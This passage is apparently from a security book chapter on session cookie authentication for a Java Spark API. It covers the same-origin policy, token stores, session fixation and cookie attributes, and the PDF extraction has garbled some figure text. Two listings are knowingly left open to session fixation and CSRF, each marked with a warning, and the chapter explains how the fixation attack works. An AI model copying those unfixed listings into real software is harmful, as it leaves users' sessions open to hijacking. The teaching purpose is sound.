behavior.      let spaceName = document.getElementById 'spaceName' .value;     let owner = document.getElementById 'owner' .value;      createSpace spaceName, owner ;      Call our API function with  values from the form.      return false; }  4.1.3  Serving the HTML from the same origin If you try to load the HTML file directly in your web browser from the file system to try it out, you’ll find that nothing happens when you click the submit button. If you open the JavaScript Console in your browser  from the View menu in Chrome, select Devel- oper and then JavaScript Console , you’ll see an error message like that shown in fig- ure 4.2. The request to the Natter API was blocked because the file was loaded from a URL that looks like file:     Users neil natter-api src main resources public natter .api, but the API is being served from a server on https:   localhost:4567 .   Figure 4.2 An error message in the JavaScript console when loading the HTML page directly. The request was  blocked because the local file is considered to be on a separate origin to the API, so browsers will block the  request by default.  By default, browsers allow JavaScript to send HTTP requests only to a server on the same  origin  that  the  script  was  loaded  from.  This  is  known  as  the  same-origin  policy  SOP  and is an important cornerstone of web browser security. To the browser, a file URL and an HTTPS URL are always on different origins, so it will block the request. In chapter 5, you’ll see how to fix this with cross-origin resource sharing  CORS , but for now let’s get Spark to serve the UI from the same origin as the Natter API.  DEFINITION The origin of a URL is the combination of the protocol, host, and port  components  of  the  URL.  If  no  port  is  specified  in  the  URL,  then  a default port is used for the protocol. For HTTP the default port is 80, while for HTTPS it is 443. For example, the origin of the URL https:  www.google .com search  has  protocol  =  https,  host  =  www.google.com,  and  port  =  443. Two  URLs  have  the  same  origin  if  the  protocol,  host,  and  port  all  exactly match each other.   106  CHAPTER 4 Session cookie authentication  The same-origin policy The same-origin policy  SOP  is applied by web browsers to decide whether to allow a page or script loaded from one origin to interact with other resources. It applies when  other  resources  are  embedded  within  a  page,  such  as  by  HTML     or   tags, and when network requests are made through form submissions or by JavaScript. Requests to the same origin are always allowed, but requests to a dif- ferent origin, known as cross-origin requests, are often blocked based on the policy. The SOP can be surprising and confusing at times, but it is a critical part of web secu- rity so it’s worth getting familiar with as an API developer. Many browser APIs avail- able to JavaScript are also restricted by origin, such as access to the HTML document itself  via the document object model, or DOM , local data storage, and cookies. The Mozilla Developer Network has an excellent article on the SOP at https:  developer .mozilla.org en-US docs Web Security Same-origin_policy.  Broadly speaking, the SOP will allow many requests to be sent from one origin to another, but it will stop the initiating origin from being able to read the response. For  example,  if  a  JavaScript  loaded  from  https:   www .alice.com  makes  a  POST request to http:   bob.net, then the request will be allowed  subject to the condi- tions described below , but the script will not be able to read the response or even see if it was successful. Embedding a resource using a HTML tag such as  ,  ,  or     is  generally  allowed,  and  in  some  cases,  this  can  reveal some information about the cross-origin response to a script, such as whether the resource exists or its size.  Only certain HTTP requests are permitted cross-origin by default, and other requests will be blocked completely. Allowed requests must be either a GET, POST, or HEAD request and can contain only a small number of allowed headers on the request, such as Accept and Accept-Language headers for content and language negotiation. A Content-Type header is allowed, but only three simple values are allowed:   application x-www-form-urlencoded  multipart form-data  text plain  These are the same three content types that can be produced by an HTML form ele- ment. Any deviation from these rules will result in the request being blocked. Cross- origin resource sharing  CORS  can be used to relax these restrictions, as you’ll learn in chapter 5.  To  instruct  Spark  to  serve  your  HTML  and  JavaScript  files,  you  add  a  staticFiles directive  to  the  main  method  where  you  have  configured  the  API  routes.  Open Main.java in your text editor and add the following line to the main method. It must come  before  any  other  route  definitions,  so  put  it  right  at  the  start  of  the  main method as the very first line:    Spark.staticFiles.location " public" ;   Authentication in web browsers  107  This  instructs  Spark  to  serve  any  files  that  it  finds  in  the  src main java resources  public folder.   TIP Static files are copied during the Maven compilation process, so you will need to rebuild and restart the API using  mvn  clean  compile  exec:java to pick up any changes to these files.  Once  you  have  configured  Spark  and  restarted  the  API  server,  you  will  be  able  to access the UI from https:   localhost:4567 natter.html. Type in any value for the new space name and owner and then click the Submit button. Depending on your browser, you will be presented with a screen like that shown in figure 4.3 prompting you for a username and password.   Figure 4.3 Chrome prompt for username and password produced automatically  when the API asks for HTTP Basic authentication  So, where did this come from? Because your JavaScript client did not supply a user- name  and  password  on  the  REST  API  request,  the  API  responded  with  a  standard HTTP  401  Unauthorized  status  and  a  WWW-Authenticate  header  prompting  for authentication using the Basic scheme. The browser understands the Basic authenti- cation scheme, so it pops up a dialog box automatically to prompt the user for a user- name and password.    Create a user with the same name as the space owner using curl at the command  line if you have not already created one, by running:  curl -H 'Content-Type: application json' \     -d '{"username":"test","password":"password"}'\     https:  localhost:4567 users  and then type in the name and password to the box, and click Sign In. If you check the JavaScript Console you will see that the space has now been created.    108  CHAPTER 4 Session cookie authentication   If you now create another space, you will see that the browser doesn’t prompt for the password again but that the space is still created. Browsers remember HTTP Basic cre- dentials  and  automatically  send  them  on  subsequent requests  to  the same  URL  path and to other endpoints on the same host and port that are siblings of the original URL. That  is,  if  the  password  was  originally  sent  to  https:   api.example.com:4567 a b c, then the browser will send the same credentials on requests to https:   api.example.com :4567 a b d, but would not send them on a request to https:   api.example.com:4567 a or other endpoints.  4.1.4 Drawbacks of HTTP authentication  Now  that  you’ve  implemented  a  simple  UI  for  the  Natter  API  using  HTTP  Basic authentication, it should be apparent that it has several drawbacks from both a user experience  and  engineering  point  of  view.  Some  of  the  drawbacks  include  the following:   The user’s password is sent on every API call, increasing the chance of it acci- dentally being exposed by a bug in one of those operations. If you are imple- menting  a  microservice  architecture   covered  in  chapter  10 ,  then  every microservice needs to securely handle those passwords.   Verifying a password is an expensive operation, as you saw in chapter 3, and performing this validation on every API call adds a lot of overhead. Modern password-hashing algorithms are designed to take around 100ms for interac- tive logins, which limits your API to handling 10 operations per CPU core per second. You’re going to need a lot of CPU cores if you need to scale up with this design!   The dialog box presented by browsers for HTTP Basic authentication is pretty ugly, with not much scope for customization. The user experience leaves a lot to be desired.   There is no obvious way for the user to ask the browser to forget the password. Even closing the browser window may not work and it often requires configur- ing advanced settings or completely restarting the browser. On a public termi- nal, this is a serious security problem if the next user can visit pages using your stored password just by clicking the Back button.  For  these  reasons,  HTTP  Basic  authentication  and  other  standard  HTTP  auth schemes  see  sidebar   are not often  used  for APIs that must be accessed  from  web browser clients. On the other hand, HTTP Basic authentication is a simple solution for APIs that are called from command-line utilities and scripts, such as system admin- istrator APIs, and has a place in service-to-service API calls that are covered in part 4, where no user is involved at all and passwords can be assumed to be strong.   Token-based authentication  109  HTTP Digest and other authentication schemes HTTP Basic authentication is just one of several authentication schemes that are sup- ported by HTTP. The most common alternative is HTTP Digest authentication, which sends a salted hash of the password instead of sending the raw value. Although this sounds  like  a  security  improvement,  the  hashing  algorithm  used  by  HTTP  Digest, MD5, is considered insecure by modern standards and the widespread adoption of HTTPS has largely eliminated its advantages. Certain design choices in HTTP Digest also prevent the server from storing the password more securely, because the weakly- hashed value must be available. An attacker who compromises the database there- fore has a much easier job than they would if a more secure algorithm had been used. If that wasn’t enough, there are several incompatible variants of HTTP Digest in use. You should avoid HTTP Digest authentication in new applications.  While there are a few other HTTP authentication schemes, most are not widely used. The exception is the more recent HTTP Bearer authentication scheme introduced by OAuth2 in RFC 6750  https:  tools.ietf.org html rfc6750 . This is a flexible token- based authentication scheme that is becoming widely used for API authentication. HTTP Bearer authentication is discussed in detail in chapters 5, 6, and 7.  Pop quiz 1 Given  a  request  to  an  API  at  https:   api.example.com:8443 test 1,  which  of the following URIs would be running on the same origin according to the same- origin policy? a http:   api.example.com test 1 b https:   api.example.com test 2 c http:   api.example.com:8443 test 2 d https:   api.example.com:8443 test 2 e https:   www .example.com:8443 test 2  The answer is at the end of the chapter.  4.2  Token-based authentication Let’s  suppose  that  your  users  are  complaining  about  the  drawbacks  of  HTTP  Basic authentication  in  your  API  and  want  a  better  authentication  experience.  The  CPU overhead  of  all  this  password  hashing  on  every  request  is  killing  performance  and driving up energy costs too. What you want is a way for users to login once and then be trusted for the next hour or so while they use the API. This is the purpose of token- based authentication, and in the form of session cookies has been a backbone of web development since very early on. When a user logs in by presenting their username and password, the API will generate a random string  the token  and give it to the cli- ent. The client then presents the token on each subsequent request, and the API can look up the token in a database on the server to see which user is associated with that   110  CHAPTER 4 Session cookie authentication  session. When the user logs out, or the token expires, it is deleted from the database, and the user must log in again if they want to keep using the API.  NOTE Some people use the term token-based authentication only when referring to non-cookie tokens covered in chapter 5. Others are even more exclusive and  only  consider  the  self-contained  token  formats  of  chapter  6  to  be  real tokens.  To switch to token-based authentication, you’ll introduce a dedicated new login end- point. This endpoint could be a new route within an existing API or a brand-new API running  as  its  own  microservice.  If  your  login  requirements  are  more  complicated, you might want to consider using an authentication service from an open source or commercial  vendor;  but  for  now,  you’ll  just  hand-roll  a  simple  solution  using  user- name and password authentication as before.    Token-based  authentication  is  a  little  more  complicated  than  the  HTTP  Basic authentication you have used so far, but the basic flow, shown in figure 4.4, is quite simple. Rather than send the username and password directly to each API endpoint, the client instead sends them to a dedicated login endpoint. The login endpoint veri- fies the username and password and then issues a time-limited token. The client then includes  that  token on  subsequent API  requests  to  authenticate. The  API endpoint  The client calls a dedicated login endpoint rather than sending credentials on every request.  Login  username, password   Client  API server  Token  The login endpoint returns a time-limited token to the client . . .  . . . and stores the token in a database.  Token store  Client  Token  API server  The client includes the token on subsequent requests.  The API server can look up the token in the database to check if the client is authenticated.  Figure 4.4 In token-based authentication, the client first makes a request to a dedicated  login endpoint with the user’s credentials. In response, the login endpoint returns a time- limited token. The client then sends that token on requests to other API endpoints that  use it to authenticate the user. API endpoints can validate the token by looking it up in  the token database.   Token-based authentication  111  can validate the token because it is able to talk to a token store that is shared between the login endpoint and the API endpoint.   In the simplest case, this token store is a shared database indexed by the token ID, but more advanced  and loosely coupled  solutions are also possible, as you’ll see in chapter 6. A short-lived token that is intended to authenticate a user while they are directly interacting with a site  or API  is often referred to as a session token, session cookie, or just session.   For web browser clients, there are several ways you can store the token on the cli- ent. Traditionally, the only option was to store the token in an HTTP cookie, which the browser remembers and sends on subsequent requests to the same site until the cookie expires or is deleted. You’ll implement cookie-based storage in the rest of this chapter and learn how to protect cookies against common attacks. Cookies are still a great choice for first-party clients running on the same origin as the API they are talking to but can be difficult when dealing with third-party clients and clients hosted on other domains. In chapter 5, you will implement an alternative to cookies using HTML 5 local storage that solves these problems, but with new challenges of its own.  DEFINITION A first-party client is a client developed by the same organization or company that develops an API, such as a web application or mobile app. Third-party  clients  are  developed  by  other  companies  and  are  usually  less trusted.  4.2.1  A token store abstraction  In this chapter and the next two, you’re going to implement several storage options for tokens with different pros and cons, so let’s create an interface now that will let you easily swap out one solution for another. Figure 4.5 shows the TokenStore inter- face and its associated Token class as a UML class diagram. Each token has an associ- ated username and an expiry time, and a collection of attributes that you can use to associate information with the token, such as how the user was authenticated or other details that you want to use to make access control decisions. Creating a token in the store returns its ID, allowing different store implementations to decide how the token should be named. You can later look up a token by ID, and you can use the Optional   >  TokenStore  + create token: Token : String  + read tokenId: String : Optional   1  0..*  Token  + username : String  + expiry : Instant  + attributes : Map   Figure 4.5 A token store has operations to create a token, returning its ID, and to look  up a token by ID. A token itself has an associated username, an expiry time, and a set  of attributes.   112  CHAPTER 4 Session cookie authentication  class to handle the fact that the token might not exist; either because the user passed an invalid ID in the request or because the token has expired.   The code to create the TokenStore interface and Token class is given in listing 4.4. As in the UML diagram, there are just two operations in the TokenStore interface for now. One is for creating a new token, and another is for reading a token given its ID. You’ll add another method to revoke tokens in section 4.6. For simplicity and concise- ness, you can use public fields for the attributes of the token. Because you’ll be writing more than one implementation of this interface, let’s create a new package to hold them.  Navigate  to  src main java com manning apisecurityinaction  and  create  a new folder named “token”. In your text editor, create a new file TokenStore.java in the new folder and copy the contents of listing 4.4 into the file, and click Save.  Listing 4.4 The TokenStore abstraction  package com.manning.apisecurityinaction.token;  import java.time.*; import java.util.*; import java.util.concurrent.*; import spark.Request;  public interface TokenStore {  A token can be  created and then  later looked up  by token ID.    String create Request request, Token token ;                Optional  read Request request, String tokenId ;       class Token {     public final Instant expiry;                         public final String username;                        public final Map  attributes;      A token has an expiry time,  an associated username,  and a set of attributes.      public Token Instant expiry, String username  {       this.expiry = expiry;       this.username = username;       this.attributes = new ConcurrentHashMap   ;        }   } }  Use a concurrent map if  the token will be accessed  from multiple threads.  In section 4.3, you’ll implement a token store based on session cookies, using Spark’s built-in  cookie  support.  Then  in  chapters  5  and  6  you’ll  see  more  advanced  imple- mentations using databases and encrypted client-side tokens for high scalability.  4.2.2  Implementing token-based login  Now that you have an abstract token store, you can write a login endpoint that uses the store. Of course, it won’t work until you implement a real token store backend, but you’ll get to that soon in section 4.3.   Token-based authentication  113    As  you’ve  already  implemented  HTTP  Basic  authentication,  you  can  reuse  that functionality  to  implement  token-based  login.  By  registering  a  new  login  endpoint and marking it as requiring authentication, using the existing UserController filter, the client will be forced to authenticate with HTTP Basic to call the new login end- point. The user controller will take care of validating the password, so all our new endpoint must do is look up the subject attribute in the request and construct a token based on that information, as shown in figure 4.6.  Authenticate user with HTTP Basic.  If Basic auth succeeds, then proceed to token login endpoint.  Request  User controller  Login endpoint  If Basic auth fails, then request is rejected.  Password database  Token store  Figure 4.6 The user controller authenticates the user with HTTP Basic  authentication as before. If that succeeds, then the request continues to the  token login endpoint, which can retrieve the authenticated subject from the  request attributes. Otherwise, the request is rejected because the endpoint  requires authentication.  The ability to reuse the existing HTTP Basic authentication mechanism makes the implementation of the login endpoint very simple, as shown in listing 4.5. To implement token-based  login,  navigate  to  src main java com manning apisecurityinaction  controller  and  create  a  new  file  TokenController.java.  The  new  controller  should take a TokenStore implementation as a constructor argument. This will allow you to swap out the token storage backend without altering the controller implementation. As the actual authentication of the user will be taken care of by the existing User- Controller, all the TokenController needs to do is pull the authenticated user sub- ject out of the request attributes  where it was set by the UserController  and create a new token using the TokenStore. You can set whatever expiry time you want for the tokens, and this will control how frequently the user will be forced to reauthenticate. In this example it’s hard-coded to 10 minutes for demonstration purposes. Copy the contents of listing 4.5 into the new TokenController.java file, and click Save.      114  CHAPTER 4 Session cookie authentication  Listing 4.5 Token-based login  package com.manning.apisecurityinaction.controller;  import java.time.temporal.ChronoUnit;  import org.json.JSONObject; import com.manning.apisecurityinaction.token.TokenStore; import spark.*;  import static java.time.Instant.now;  public class TokenController {      private final TokenStore tokenStore;                    public TokenController TokenStore tokenStore  {            this.tokenStore = tokenStore;                      }  Inject the token store  as a constructor  argument.      public JSONObject login Request request, Response response  {         String subject = request.attribute "subject" ;                    var expiry = now  .plus 10, ChronoUnit.MINUTES ;                   var token = new TokenStore.Token expiry, subject ;            var tokenId = tokenStore.create request, token ;               response.status 201 ;         return new JSONObject                                                 .put "token", tokenId ;                           } }  Extract  the subject  username from  the request and  pick a suitable  expiry time.  Create the token  in the store and  return the token  ID in the response.  You can now wire up the TokenController as a new endpoint that clients can call to login and get a session token. To ensure that users have authenticated using the User- Controller before they hit the TokenController login endpoint, you should add the new  endpoint  after  the  existing  authentication  filters.  Given  that  logging  in  is  an important action from a security point of view, you should also make sure that calls to the login endpoint are logged by the AuditController as for other endpoints. To add the new login endpoint, open the Main.java file in your editor and add lines to create a new TokenController and expose it as a new endpoint, as in listing 4.6. Because you don’t yet have a real  TokenStore implementation, you can pass a  null value to the TokenController  for  now.  Rather  than  have  a   login  endpoint,  we’ll  treat  session tokens as a resource and treat logging in as creating a new session resource. There- fore, you should register the TokenController login method as the handler for a POST request to a new  sessions endpoint. Later, you will implement logout as a DELETE request to the same endpoint.      Session cookies  115  Listing 4.6 The login endpoint  TokenStore tokenStore = null;                            var tokenController = new TokenController tokenStore ;    before userController::authenticate ;      Create the new  TokenController,  at first with a null  TokenStore.  var auditController = new AuditController database ;    before auditController::auditRequestStart ;             afterAfter auditController::auditRequestEnd ;            Calls to the login endpoint  should be logged, so make  sure that also happens first.  before " sessions", userController::requireAuthentication ;   post " sessions", tokenController::login ;                     Ensure the user is authenticated  by the UserController first.  Reject unauthenticated  requests before the  login endpoint can be  accessed.  4.3  Once you’ve added the code to wire up the TokenController, it’s time to write a real implementation of the TokenStore interface. Save the Main.java file, but don’t try to test it yet because it will fail.  Session cookies The  simplest  implementation  of  token-based  authentication,  and  one  that  is  widely implemented on almost every website, is cookie-based. After the user authenticates, the login endpoint returns a  Set-Cookie header on the response that instructs the web  browser  to  store  a  random  session  token  in  the  cookie  storage.  Subsequent requests to the same site will include the token as a  Cookie header. The server can then look up the cookie token in a database to see which user is associated with that token, as shown in figure 4.7.  Are cookies RESTful? One of the key principles of the REST architectural style is that interactions between the client and the server should be stateless. That is, the server should not store any client-specific  state  between  requests.  Cookies  appear  to  violate  this  principle because the server stores state associated with the cookie for each client. Early uses of session cookies included using them as a place to store temporary state such as a shopping cart of items that have been selected by the user but not yet paid for. These abuses of cookies often broke expected behavior of web pages, such as the behavior of the back button or causing a URL to display differently for one user com- pared to another.  When used purely to indicate the login state of a user at an API, session cookies are a relatively benign violation of the REST principles, and they have many security attri- butes that are lost when using other technologies. For example, cookies are associ- ated with a domain, so the browser ensures that they are not accidentally sent to other sites. They can also be marked as Secure, which prevents the cookie being acci- dentally sent over a non-HTTPS connection where it might be intercepted. I therefore   116  CHAPTER 4 Session cookie authentication   continued  think that cookies still have an important role to play for APIs that are designed to serve browser-based clients served from the same origin as the API. In chapter 6, you’ll learn about alternatives to cookies that do not require the server to maintain any per-client state, and in chapter 9, you’ll learn how to use capability URIs for a more RESTful solution.     When the user logs in, the server responds with a Set-Cookie header.  Login  Web browser  client  Set-Cookie: SESSID=XyZ...  Web server  Token store  Web browser  client  POST  spaces ...  Cookie: SESSID=XyZ...  Web server  Token store  On subsequent requests, the browser sends the session token as a Cookie header.  Figure 4.7 In session cookie authentication, after the user logs in the server  sends a Set-Cookie header on the response with a random session token. On  subsequent requests to the same server, the browser will send the session token  back in a Cookie header, which the server can then look up in the token store to  access the session state.  Cookie-based sessions are so widespread that almost every web framework for any lan- guage has built-in support for creating such session cookies, and Spark is no excep- tion.  In  this  section  you’ll  build  a  TokenStore  implementation  based  on  Spark’s session cookie support. To access the session associated with a request, you can use the request.session   method:  Session session = request.session true ;  Spark will check to see if a session cookie is present on the request, and if so, it will look up any state associated with that session in its internal database. The single boolean argument indicates whether you would like Spark to create a new session if one does   Session cookies  117  not yet exist. To create a new session, you pass a true value, in which case Spark will generate a new session token and store it in its database. It will then add a Set-Cookie header to the response. If you pass a false value, then Spark will return null if there is no Cookie header on the request with a valid session token.   Because we can reuse the functionality of Spark’s built-in session management, the implementation of the cookie-based token store is almost trivial, as shown in list- ing 4.7. To create a new token, you can simply create a new session associated with the request and then store the token attributes as attributes of the session. Spark will take care of storing these attributes in its session database and setting the appropriate Set- Cookie header. To read tokens, you can just check to see if a session is associated with the request, and if so, populate the  Token object from the attributes on the session. Again, Spark takes care of checking if the request has a valid session Cookie header and looking up the attributes in its session database. If there is no valid session cookie associated with the request, then Spark will return a  null session object, which you can then return as an Optional.empty  value to indicate that no token is associated with this request.    To create the cookie-based token store, navigate to src main java com manning  apisecurityinaction token and create a new file named CookieTokenStore.java. Type in the contents of listing 4.7, and click Save.  WARNING This  code  suffers  from  a  vulnerability  known  as  session  fixation. You’ll fix that shortly in section 4.3.1.  Listing 4.7 The cookie-based TokenStore  package com.manning.apisecurityinaction.token;  import java.util.Optional; import spark.Request;  public class CookieTokenStore implements TokenStore {      @Override     public String create Request request, Token token  {             WARNING: session fixation vulnerability!         var session = request.session true ;             Pass true to  request.session    to create a new  session cookie.          session.attribute "username", token.username ;             session.attribute "expiry", token.expiry ;                 session.attribute "attrs", token.attributes ;       Store token attributes  as attributes of the  session cookie.          return session.id  ;     }      @Override     public Optional  read Request request, String tokenId  {   118  CHAPTER 4 Session cookie authentication          var session = request.session false ;               if  session == null  {             return Optional.empty  ;         }                  var token = new Token session.attribute "expiry" ,                      session.attribute "username"  ;                         token.attributes.putAll session.attribute "attrs"  ;     Pass false to request.session    to check if a valid session is  present.  Populate the Token  object with the  session attributes.          return Optional.of token ;     } }  You can now wire up the TokenController to a real TokenStore implementation. Open the  Main.java file in your  editor and find  the lines  that  create the TokenController. Replace the null argument with an instance of the CookieTokenStore as follows:  TokenStore tokenStore = new CookieTokenStore  ; var tokenController = new TokenController tokenStore ;  Save the file and restart the API. You can now try out creating a new session. First cre- ate a test user if you have not done so already:  $ curl -H 'Content-Type: application json' \     -d '{"username":"test","password":"password"}' \     https:  localhost:4567 users {"username":"test"}  You can then call the new  sessions endpoint, passing in the username and password using HTTP Basic authentication to get a new session cookie:  Use the -u option  to send HTTP Basic  credentials.  $ curl -i -u test:password \                     -H 'Content-Type: application json' \     -X POST https:  localhost:4567 sessions HTTP 1.1 201 Created Date: Sun, 19 May 2019 09:42:43 GMT Set-Cookie:  ➥ JSESSIONID=node0hwk7s0nq6wvppqh0wbs0cha91.node0;Path= ;Secure; ➥ HttpOnly                            Expires: Thu, 01 Jan 1970 00:00:00 GMT Content-Type: application json X-Content-Type-Options: nosniff X-XSS-Protection: 0 Cache-Control: no-store Server:  Transfer-Encoding: chunked  Spark returns a Set- Cookie header for the  new session token.  {"token":"node0hwk7s0nq6wvppqh0wbs0cha91"}     The TokenController also  returns the token in the  response body.   4.3.1  Session cookies  119  Avoiding session fixation attacks The code you’ve just written suffers from a subtle but widespread security flaw that affects all forms of token-based authentication, known as a session fixation attack. After the user authenticates, the CookieTokenStore then asks for a new session by calling request.session true . If the request did not have an existing session cookie, then this will create a new session. But if the request already contains an existing session cookie, then Spark will return that existing session and not create a new one. This can create a security vulnerability if an attacker is able to inject their own session cookie into another user’s web browser. Once the victim logs in, the API will change the user- name attribute in the session from the attacker’s username to the victim’s username. The attacker’s session token now allows them to access the victim’s account, as shown in figure 4.8. Some web servers will produce a session cookie as soon as you access the login page, allowing an attacker to obtain a valid session cookie before they have even logged in.  DEFINITION A session fixation attack occurs when an API fails to generate a new session token after a user has authenticated. The attacker captures a session token from loading the site on their own device and then injects that token  3. Once the user logs in, the attacker’s  session is updated to access the victim’s account.  t a c k e r  u s e r n a m e = a t  username=victim  Token store  Attacker session  API server  i  n g o L  i  e k o o c   n o s s e S  i  i  n g o L  . . .  i  = d s s e s  1.

Attacker  Victim  Figure 4.8 In a session fixation attack, the attacker first logs in to obtain a valid session token. They then  inject that session token into the victim’s browser and trick them into logging in. If the existing session is not  invalidating during login then the attacker’s session will be able to access the victim’s account.   120  CHAPTER 4 Session cookie authentication  into  the  victim’s  browser.  Once the  victim  logs  in,  the  attacker  can  use  the original session token to access the victim’s account.  Browsers will prevent a site hosted on a different origin from setting cookies for your API, but there are still ways that session fixation attacks can be exploited. First, if the attacker can exploit an XSS attack on your domain, or any sub-domain, then they can use this to set a cookie. Second, Java servlet containers, which Spark uses under the hood, support different ways to store the session token on the client. The default, and safest, mechanism is to store the token in a cookie. But you can also configure the servlet  container  to  store  the  session  by  rewriting  URLs  produced  by  the  site  to include the session token in the URL itself. Such URLs look like the following:   https:  api.example.com users jim;JSESSIONID=l8Kjd…   The ;JSESSIONID=… bit is added by the container and is parsed out of the URL on sub- sequent requests. This style of session storage makes it much easier for an attacker to carry out a session fixation attack because they can simply lure the user to click on a link like the following:   https:  api.example.com login;JSESSIONID=   If you use a servlet container for session management, you should ensure that the ses- sion tracking-mode is set to COOKIE in your web.xml, as in the following example:         COOKIE     This is the default in the Jetty container used by Spark. You can prevent session fixa- tion attacks by ensuring that any existing session is invalidated after a user authenti- cates.  This  ensures  that  a  new  random  session  identifier  is  generated,  which  the attacker is unable to guess. The attacker’s session will be logged out. Listing 4.8 shows the updated CookieTokenStore. First, you should check if the client has an existing session cookie by calling request.session false . This instructs Spark to return the existing session, if one exists, but will return null if there is not an existing session. Invalidate any existing session to ensure that the next call to request.session true  will create a new one. To eliminate the vulnerability, open CookieTokenStore.java in your editor and update the login code to match listing 4.8.  Listing 4.8 Preventing session fixation attacks      @Override     public String create Request request, Token token  {          var session = request.session false ;            if  session != null  {                               session.invalidate  ;                 Check if there is an  existing session and  invalidate it.   Session cookies  121          }         session = request.session true ;              session.attribute "username", token.username ;         session.attribute "expiry", token.expiry ;         session.attribute "attrs", token.attributes ;  Create a fresh session  that is unguessable to  the attacker.          return session.id  ;     }  4.3.2  Cookie security attributes As you can see from the output of curl, the Set-Cookie header generated by Spark sets the  JSESSIONID  cookie  to  a  random  token  string  and  sets  some  attributes  on  the cookie to limit how it is used:  Set-Cookie:  ➥ JSESSIONID=node0hwk7s0nq6wvppqh0wbs0cha91.node0;Path= ;Secure; ➥ HttpOnly  There are several standard attributes that can be set on a cookie to prevent accidental misuse. Table 4.1 lists the most useful attributes from a security point of view.   Table 4.1 Cookie security attributes  Cookie  attribute  Secure  HttpOnly  SameSite  Domain  Path  Meaning  Secure cookies are only ever sent over a HTTPS connection and so cannot be stolen  by network eavesdroppers.  Cookies marked HttpOnly cannot be read by JavaScript, making them slightly  harder to steal through XSS attacks.   SameSite cookies will only be sent on requests that originate from the same origin  as the cookie. SameSite cookies are covered in section 4.4.  If no Domain attribute is present, then a cookie will only be sent on requests to the  exact host that issued the Set-Cookie header. This is known as a host-only cookie. If  you set a Domain attribute, then the cookie will be sent on requests to that domain  and all sub-domains. For example, a cookie with Domain=example.com will be sent  on requests to api.example.com and www .example.com. Older versions of the cookie  standards required a leading dot on the domain value to include subdomains  such  as Domain=.example.com , but this is the only behavior in more recent versions and  so any leading dot is ignored. Don’t set a Domain attribute unless you really need the  cookie to be shared with subdomains.  If the Path attribute is set to  users, then the cookie will be sent on any request to a  URL that matches  users or any sub-path such as  users mary, but not on a request  to  cats mrmistoffelees. The Path defaults to the parent of the request that returned  the Set-Cookie header, so you should normally explicitly set it to   if you want the  cookie to be sent on all requests to your API. The Path attribute has limited security  benefits, as it is easy to defeat by creating a hidden iframe with the correct path and  reading the cookie through the DOM.   122  CHAPTER 4 Session cookie authentication  Table 4.1 Cookie security attributes  continued   Cookie  attribute  Expires and  Max-Age  Meaning  Sets the time at which the cookie expires and should be forgotten by the client,  either as an explicit date and time  Expires  or as the number of seconds from now   Max-Age . Max-Age is newer and preferred, but Internet Explorer only understands  Expires. Setting the expiry to a time in the past will delete the cookie immediately. If  you do not set an explicit expiry time or max-age, then the cookie will live until the  browser is closed.  Persistent cookies A cookie with an explicit Expires or Max-Age attribute is known as a persistent cookie and will be permanently stored by the browser until the expiry time is reached, even if the browser is restarted. Cookies without these attributes are known as session cookies  even if they have nothing to do with a session token  and are deleted when the browser window or tab is closed. You should avoid adding the Max-Age or Expires attributes  to  your  authentication  session  cookies  so  that  the  user  is  effectively logged out when they close their browser tab. This is particularly important on shared devices, such as public terminals or tablets that might be used by many different peo- ple. Some browsers will now restore tabs and session cookies when the browser is restarted  though,  so  you  should  always  enforce  a  maximum  session  time  on  the server rather than relying on the browser to delete cookies appropriately. You should also consider implementing a maximum idle time, so that the cookie becomes invalid if it has not been used for three minutes or so. Many session cookie frameworks implement these checks for you.  Persistent  cookies  can  be  useful  during  the  login  process  as  a  “Remember  Me” option to avoid the user having to type in their username manually, or even to auto- matically log the user in for low-risk operations. This should only be done if trust in the device and the user can be established by other means, such as looking at the location, time of day, and other attributes that are typical for that user. If anything looks out of the ordinary, then a full authentication process should be triggered. Self- contained tokens such as JSON Web Tokens  see chapter 6  can be useful for imple- menting persistent cookies without storing long-lived state on the server.  You should always set cookies with the most restrictive attributes that you can get away with. The Secure and HttpOnly attributes should be set on any cookie used for secu- rity purposes. Spark produces Secure and HttpOnly session cookies by default. Avoid setting a Domain attribute unless you absolutely need the same cookie to be sent to multiple  sub-domains,  because  if  just  one  sub-domain  is  compromised  then  an attacker  can  steal  your  session  cookies.  Sub-domains  are  often  a  weak  point  in  web security due to the prevalence of sub-domain hijacking vulnerabilities.  DEFINITION Sub-domain  hijacking   or  sub-domain  takeover   occurs  when  an attacker  is  able  to  claim  an  abandoned  web  host  that  still  has  valid  DNS   Session cookies  123  records configured. This typically occurs when a temporary site is created on a  shared  service  like  GitHub  Pages  and  configured  as  a  sub-domain  of  the main website. When the site is no longer required, it is deleted but the DNS records are often forgotten. An attacker can discover these DNS records and re-register the site on the shared web host, under the attacker's control. They can then serve their content from the compromised sub-domain.  Some  browsers  also  support  naming  conventions  for  cookies  that  enforce  that  the cookie  must  have  certain  security  attributes  when  it  is  set.  This  prevents  accidental mistakes  when  setting  cookies  and  ensures  an  attacker  cannot  overwrite  the  cookie with one with weaker attributes. These cookie name prefixes are likely to be incorpo- rated into the next version of the cookie specification. To activate these defenses, you should name your session cookie with one of the following two special prefixes:   __Secure-—Enforces that the cookie must be set with the Secure attribute and  set by a secure origin.   __Host-—Enforces the same protections as  __Secure-, but also enforces that the cookie is a host-only cookie  has no Domain attribute . This ensures that the cookie cannot be overwritten by a cookie from a sub-domain and is a signif- icant protection against sub-domain hijacking attacks.  NOTE These  prefixes  start  with  two  underscore  characters  and  include  a hyphen at  the  end. For  example, if your cookie  was  previously  named “ses- sion,” then the new name with the host prefix would be “__Host-session.”  Validating session cookies You’ve now implemented cookie-based login, but the API will still reject requests that do not supply a username and password, because you are not checking for the session cookie anywhere. The existing HTTP Basic authentication filter populates the subject attribute on the request if valid credentials are found, and later access control filters check for the presence of this subject attribute. You can allow requests with a session cookie to proceed by implementing the same contract: if a valid session cookie is pres- ent, then extract the username from the session and set it as the subject attribute in the request, as shown in listing 4.9. If a valid token is present on the request and not expired,  then  the  code  sets  the  subject  attribute  on  the  request  and  populates  any other token attributes. To add token validation, open TokenController.java in your editor and add the validateToken method from the listing and save the file.  WARNING This code is vulnerable to Cross-Site Request Forgery attacks. You will fix these attacks in section 4.4.  Listing 4.9 Validating a session cookie  public void validateToken Request request, Response response  {        WARNING: CSRF attack possible     tokenStore.read request, null .ifPresent token -> {             if  now  .isBefore token.expiry   {                  Check if a token is  present and not expired.  4.3.3   124  CHAPTER 4 Session cookie authentication              request.attribute "subject", token.username ;                 token.attributes.forEach request::attribute ;             }     } ; }  Populate the request subject attribute and any attributes associated with the token.  Because the CookieTokenStore can determine the token associated with a request by looking at the cookies, you can leave the tokenId argument null for now when 